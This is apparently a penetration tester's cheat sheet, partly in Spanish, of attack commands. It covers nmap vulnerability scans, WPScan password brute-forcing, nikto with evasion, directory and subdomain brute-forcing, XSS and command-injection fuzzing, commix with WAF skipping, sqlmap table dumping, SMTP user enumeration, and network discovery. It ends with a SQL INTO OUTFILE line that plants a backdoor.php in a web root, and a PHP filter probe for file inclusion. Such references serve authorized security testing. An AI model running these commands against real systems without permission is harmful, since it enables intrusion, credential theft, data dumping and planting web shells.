================================================================================
=== Nmap ====


nmap -p- -sT -sV -A 

nmap -p- -sC -sV  --open

nmap -p- --script=vuln 

###HTTP-Methods

nmap --script http-methods --script-args http-methods.url-path='/website'

###  --script smb-enum-shares

sed IPs:

grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' FILE

================================================================================

=== WPScan & SSL ====

wpscan --url  --disable-tls-checks --enumerate p --enumerate t --enumerate u

=== Fuerza Bruta con WPScan:

wpscan --url  --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt

=== Detección de plugins en modo agresivo:

wpscan --url  --enumerate p --plugins-detection aggressive

================================================================================

===Nikto con ssl y modo evasión

nikto --host  -ssl -evasion 1

SEE EVASION MODALITIES.
================================================================================

=== dns_recon ====

dnsrecon –d yourdomain.com

================================================================================

=== Enumera directorios con gobuster: ====

gobuster dir -u  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -l -k -t 30

===Enumera archivos con gobuster:

gobuster dir -u  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -l -k -t 30

===Fueza bruta a subdominios con gobuster : 

gobuster dns -d domain.org -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30

Asegúrate de que cualquier nombre de DNS que encuentres se resuelva a una dirección dentro del alcance antes de probarlo.

================================================================================

=== Extraer todas las IPs de un archivo de texto. ===

grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' nmapfile.txt

================================================================================

=== Wfuzz XSS Fuzzing ===

wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt 

wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt 

=== Inyeccion de comandos con datos en POST:

wfuzz -c -z file,/usr/share/seclists/Fuzzing/command-injection-commix.txt -d doi=FUZZ 

=== Prueba los parametros existentes:

wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt 

===  Fuzzing a Directorios (Autenticado):

wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d SESSIONID=value 

=== Fuzzing de Archivos (Autenticado):

wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -d SESSIONID=value 

=== Fuzzing a Directorios:

wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 

=== Fuzzing a Archivos:

wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 

Lista grande de palabras:

wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 

Usuarios:

wfuzz -c -z file,/usr/share/seclists/Usernames/top-usernames-shortlist.txt --hc 404,403 


================================================================================

=== Inyección de comandos con  commix, ssl, waf, random agent. ===

commix --url=https://supermegaleetultradomain.com?parameter= --level=3 --force-ssl --skip-waf --random-agent

================================================================================

=== SQLMap ===

sqlmap -u  --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl

sqlmap -u  --threads=2 --time-sec=10 --level=4 --risk=3 --dump

/SecLists/Fuzzing/alphanum-case.txt

================================================================================

=== Social Recon ===

theharvester -d domain.org -l 500 -b google

================================================================================

=== Nmap HTTP-methods ===

nmap -p80,443 --script=http-methods  --script-args http-methods.url-path='/directory/goes/here'

================================================================================

=== Enumeración de usuarios SMTP ===

smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 

smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 

smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 

smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 

================================================================================

=== Verificacion de Execucion de Comandos - [Ping] ==

tcpdump -i any -c5 icmp

=== Buscar dispositivos en la red ===

netdiscover /r 0.0.0.0/24

arp-scan --interface eth0 0.0.0.0/24

====

#INTO OUTFILE D00R

SELECT “” into outfile “/var/www/WEROOT/backdoor.php”;

====

LFI?

#PHP Filter Checks.

php://filter/convert.base64-encode/resource=

====
